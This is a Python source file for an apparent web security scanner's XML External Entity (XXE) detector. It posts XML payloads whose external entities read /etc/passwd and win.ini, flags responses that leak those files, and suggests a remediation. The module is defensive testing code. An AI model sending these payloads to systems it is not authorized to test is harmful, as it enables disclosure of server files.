"""XML External Entity (XXE) Injection Detector.

Category: Injection
Evidence Type: HTTP Traffic
"""

from __future__ import annotations

import logging
import re
from typing import Any

from dast.detectors.base import BaseDetector
from dast.http_client import HTTPClient
from dast.models import (
    Confidence,
    DetectorCategory,
    Endpoint,
    EvidenceType,
    Finding,
    HttpMethod,
    Severity,
)

logger = logging.getLogger(__name__)

XXE_PAYLOADS = [
    (
        """<?xml version="1.0" encoding="utf-8"?><!DOCTYPE reset [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><reset><login>&xxe;</login><secret>test</secret></reset>""",
        re.compile(r"root:.*:0:0:", re.I),
        "Linux /etc/passwd disclosure via external entity",
    ),
    (
        """<?xml version="1.0" encoding="utf-8"?><!DOCTYPE reset [<!ENTITY xxe SYSTEM "file://c:/windows/win.ini">]><reset><login>&xxe;</login><secret>test</secret></reset>""",
        re.compile(r"\[fonts\]|\[extensions\]", re.I),
        "Windows win.ini disclosure via external entity",
    ),
]


class XXEDetector(BaseDetector):
    """Detects XML External Entity (XXE) Injection by sending XML payloads with external entity declarations."""

    name = "xxe"
    description = "Audits XML endpoints and body parameters for XML External Entity (XXE) Injection"
    category = DetectorCategory.INJECTION
    default_evidence_type = EvidenceType.HTTP_TRAFFIC

    def scan(
        self,
        endpoint: Endpoint,
        client: HTTPClient,
        browser: Any | None = None,
        form_handler: Any | None = None,
        **kwargs: Any,
    ) -> list[Finding]:
        findings: list[Finding] = []

        # Target endpoints with XML content or accepting POST
        if endpoint.method == HttpMethod.POST or "xml" in endpoint.url.lower():
            for xml_payload, pattern, desc in XXE_PAYLOADS:
                headers = {"Content-Type": "application/xml"}
                resp, req_meta, res_meta = client.post(endpoint.url, data=xml_payload, headers=headers)
                if not resp or not resp.text:
                    continue

                if pattern.search(resp.text):
                    findings.append(
                        self.create_finding(
                            title="XML External Entity (XXE) Injection",
                            severity=Severity.HIGH,
                            confidence=Confidence.CERTAIN,
                            url=endpoint.url,
                            method=endpoint.method.value,
                            evidence=(
                                f"HTTP Traffic Evidence (XXE):\n"
                                f"Payload: External Entity Declaration\n"
                                f"Matched Sensitive Indicator: '{pattern.pattern}'\n"
                                f"Technique: {desc}"
                            ),
                            evidence_type=EvidenceType.HTTP_TRAFFIC,
                            description=(
                                "The XML parser on this endpoint processes external entity declarations (XXE), "
                                "enabling arbitrary local file disclosure and server-side request forgery."
                            ),
                            remediation="Disable DTDs (External Entities) and libxml entity loading (LIBXML_NOENT/LIBXML_DTDLOAD) in the XML parser.",
                            request_metadata=req_meta,
                            response_metadata=res_meta,
                        )
                    )
                    return findings

        return findings

